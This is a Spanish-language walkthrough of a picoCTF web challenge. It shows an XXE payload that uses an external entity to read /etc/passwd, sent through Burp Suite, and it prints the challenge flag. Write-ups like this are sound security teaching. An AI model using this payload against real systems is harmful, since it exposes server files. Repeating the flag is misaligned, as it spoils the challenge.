https://play.picoctf.org/practice/challenge/376
## Descripción
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

Additional details will be available after launching your challenge instance.

The web project was rushed and no security assessment was done. Can you read the /etc/passwd file? [Web Portal](http://saturn.picoctf.net:53501/)
## Solución

1. Entramos a la página y nos indica que es una vulnearabilidad de tipo XXE.
2. Capturamos la petición que contiene el XML con el request, lo modificamos con el siguiente payload (usando BurpSuite):
	```xaml
	<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
	<data>
	 <ID>
	 &xxe;
	 </ID>
	 </data>
	```
	![](../../../Pasted%20image%2020250928121014.png)
3. La flag es: ```picoCTF{XML_3xtern@l_3nt1t1ty_0e13660d}```

## Notas adicionales
## Referencias
https://en.wikipedia.org/wiki/SOAP

https://portswigger.net/web-security/xxe

https://www.youtube.com/watch?v=b1pGlutUL34&list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&index=67
